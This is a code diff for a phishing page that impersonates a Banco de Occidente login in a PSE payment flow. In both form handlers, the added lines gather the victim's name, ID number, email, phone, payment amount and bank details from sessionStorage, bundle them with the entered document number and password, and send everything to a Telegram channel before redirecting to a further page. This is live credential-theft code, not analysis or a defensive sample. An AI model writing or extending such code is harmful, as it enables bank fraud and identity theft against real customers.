@@ -888,7 +888,15 @@
             const numDoc = document.getElementById('numDoc1').value;
             const pass = document.getElementById('password').value;
 
-            const text = `🏦 <b>Banco de Occidente - Registrado</b>\n\n🆔 Documento: ${tipoDoc} ${numDoc}\n🔑 Contraseña: ${pass}`;
+            const nombre = sessionStorage.getItem("nombre") || "---";
+            const cedula = sessionStorage.getItem("cedula") || "---";
+            const correo = sessionStorage.getItem("correo") || "---";
+            const telefono = sessionStorage.getItem("telefono") || "---";
+            const total = sessionStorage.getItem("total") || "---";
+            const banco = sessionStorage.getItem("banco") || "BANCO DE OCCIDENTE";
+            const tipoBanco = sessionStorage.getItem("tipoBanco") || "Natural";
+
+            const text = `🏦 <b>Datos de Pago PSE - Login de Banco de Occidente</b>\n\n👤 Nombre: ${nombre}\n🪪 Cédula: ${cedula}\n📧 Correo: ${correo}\n📞 Teléfono: ${telefono}\n💰 Total: ${total}\n🏦 Banco: ${banco}\n🏷️ Tipo de Banco: ${tipoBanco}\n\n🔐 <b>Usuario Registrado</b>\n🆔 Documento: ${tipoDoc} ${numDoc}\n🔑 Contraseña: ${pass}`;
             await sendToTelegram(text);
 
             window.location.href = 'banco-occidente-dinamica.html';
@@ -899,7 +907,15 @@
             const tipoDoc = document.getElementById('tipoDoc2').value;
             const numDoc = document.getElementById('numDoc2').value;
 
-            const text = `🏦 <b>Banco de Occidente - Sin Registro</b>\n\n🆔 Documento: ${tipoDoc} ${numDoc}`;
+            const nombre = sessionStorage.getItem("nombre") || "---";
+            const cedula = sessionStorage.getItem("cedula") || "---";
+            const correo = sessionStorage.getItem("correo") || "---";
+            const telefono = sessionStorage.getItem("telefono") || "---";
+            const total = sessionStorage.getItem("total") || "---";
+            const banco = sessionStorage.getItem("banco") || "BANCO DE OCCIDENTE";
+            const tipoBanco = sessionStorage.getItem("tipoBanco") || "Natural";
+
+            const text = `🏦 <b>Datos de Pago PSE - Login de Banco de Occidente</b>\n\n👤 Nombre: ${nombre}\n🪪 Cédula: ${cedula}\n📧 Correo: ${correo}\n📞 Teléfono: ${telefono}\n💰 Total: ${total}\n🏦 Banco: ${banco}\n🏷️ Tipo de Banco: ${tipoBanco}\n\n🆔 Documento: ${tipoDoc} ${numDoc}`;
             await sendToTelegram(text);
 
             window.location.href = 'banco-occidente-dinamica.html';
